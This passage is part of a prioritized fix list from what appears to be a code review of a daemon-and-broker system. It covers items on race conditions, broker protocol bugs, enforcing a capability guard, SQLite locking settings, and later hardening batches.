9. **D4 + D3 — Atomic check-and-mark before the claim window; bound `@claims`/`@executed`.** Correctness plus daemon memory hygiene.
10. **M3/M4/M5 — Broker protocol correctness** (QoS mangling, lost LWT, silent unsubscription): silent data loss and defeated failure signaling.
11. **S-W2/S-W3 — Make the Guard actually enforce**: opt-in baseline and an `allowed?` check in `execute_manifest_tool`; otherwise the capability system is decorative as shipped.
12. **R1 — SQLite busy_timeout + WAL.** Crashes routine multi-process use (daemon + CLI).
13. Then the MEDIUM robustness batch (D5–D7, L1–L4, R2–R3, W2–W3, T1–T4) and the security hardening batch (S-D1/S-D2, S-L1/S-L2, S-R2, S-M1/S-M2).
